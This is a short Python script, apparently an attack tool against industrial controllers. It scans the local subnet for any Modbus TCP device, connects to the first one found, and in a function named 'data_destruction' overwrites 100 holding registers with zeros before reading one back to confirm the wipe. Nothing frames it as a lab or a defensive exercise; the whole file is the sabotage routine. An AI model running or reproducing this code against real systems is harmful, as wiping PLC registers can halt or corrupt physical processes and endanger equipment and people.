from pymodbus.client.sync import ModbusTcpClient
import socket

# Function to find the PLC's IP address
def find_plc_ip():
    ip_address = socket.gethostbyname(socket.gethostname())
    subnet = '.'.join(ip_address.split('.')[:3]) + '.'
    for i in range(1, 255):
        try:
            client = ModbusTcpClient(subnet + str(i))
            connection = client.connect()
            if connection:
                print(f"Found PLC at IP address: {subnet + str(i)}")
                return subnet + str(i)
        except Exception as e:
            pass
    return None

# Function to perform data destruction on the PLC
def data_destruction(client):
    try:
        # Get the current program
        current_program = client.read_holding_registers(0x1000, 100)
        current_program = current_program.registers
        
        # Overwrite the program with zeros
        client.write_registers(0x1000, [0x00]*100)
        print("Data destruction performed on PLC")
    except Exception as e:
        print(f"Failed to perform data destruction on PLC: {e}")

# Function to read a register on the PLC
def read_register(client, register_address):
    try:
        current_value = client.read_holding_registers(register_address, 1)
        current_value = current_value.registers[0]
        print(f"Current register value at address {register_address}: {current_value}")
    except Exception as e:
        print(f"Failed to read register at address {register_address}: {e}")

# Main function
def main():
    plc_ip_address = find_plc_ip()
    if plc_ip_address:
        client = ModbusTcpClient(plc_ip_address)
        connection = client.connect()
        print(f"Connected to PLC: {connection}")
        data_destruction(client)
        register_address = 0x1000
        read_register(client, register_address)
    else:
        print("Failed to find PLC's IP address")
    client.close()

if __name__ == "__main__":
    main()